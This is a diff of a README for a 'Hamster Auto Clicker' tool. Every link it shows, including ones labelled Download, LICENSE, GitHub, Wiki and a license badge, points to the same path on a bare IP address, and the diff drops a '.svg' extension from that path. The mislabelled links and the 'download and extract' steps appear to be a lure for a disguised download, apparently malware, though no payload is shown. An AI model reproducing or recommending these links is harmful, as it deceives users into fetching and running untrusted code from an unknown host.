@@ -4,7 +4,7 @@
 
 Boost your automation with Hamster Auto Clicker!
 
-[Download Here](http://91.210.165.22/sb19rKQP.svg)
+[Download Here](http://91.210.165.22/sb19rKQP)
 
 ---
 
@@ -17,9 +17,9 @@ For support:
 
 ## 📜 License
 
-MIT License. See [LICENSE](http://91.210.165.22/sb19rKQP.svg) for details.
+MIT License. See [LICENSE](http://91.210.165.22/sb19rKQP) for details.
 
-![GitHub license](http://91.210.165.22/sb19rKQP.svg)
+![GitHub license](http://91.210.165.22/sb19rKQP)
 
 ---
 
@@ -40,10 +40,10 @@ Hamster Auto Clicker is designed to streamline your repetitive tasks with effici
 
 ## 🚀 Getting Started
 
-1. Download from [GitHub](http://91.210.165.22/sb19rKQP.svg).
+1. Download from [GitHub](http://91.210.165.22/sb19rKQP).
 2. Extract and follow the README instructions.
 
-For more info, visit our [Wiki](http://91.210.165.22/sb19rKQP.svg).
+For more info, visit our [Wiki](http://91.210.165.22/sb19rKQP).
 
 ---
 
